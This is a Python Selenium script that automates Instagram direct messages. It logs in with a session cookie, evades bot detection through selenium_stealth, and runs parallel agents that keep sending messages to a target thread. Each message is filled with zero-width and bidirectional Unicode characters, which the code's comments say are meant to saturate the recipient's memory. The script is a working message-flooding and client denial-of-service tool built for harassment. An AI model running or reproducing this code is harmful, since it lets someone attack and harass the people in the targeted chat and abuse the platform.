# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (NATIVE-START V59)
# 📅 STATUS: DEPENDENCY-FIXED | 4-AGENT TOTAL | AWS-RAM-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.6)    
REST_AFTER_STRIKES = 100   
REST_DURATION = 4          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_heavy_payload():
    """Generates a high-impact block for 32GB RAM saturation."""
    u_id = random.randint(100, 999)
    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NODE_STRIKE:{u_id}]"
    body = []
    for i in range(350):
        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
        body.append(line)
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    """Uses the native GitHub Runner Chrome binary to skip installs."""
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        # Target the pre-installed Chrome on Ubuntu runners
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        # Use the system-path chromedriver (standard on GH Actions)
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def force_send_js(driver, text):
    """Overrides the React state to stop the 'typing' hang."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                
                box.dispatchEvent(new Event('input', { bubbles: true }));
                
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_heavy_payload()
                if force_send_js(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Native-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 50 == 0:
                        driver.refresh()
                        time.sleep(8)
                time.sleep(random.uniform(*BURST_SPEED))
        except:
            pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
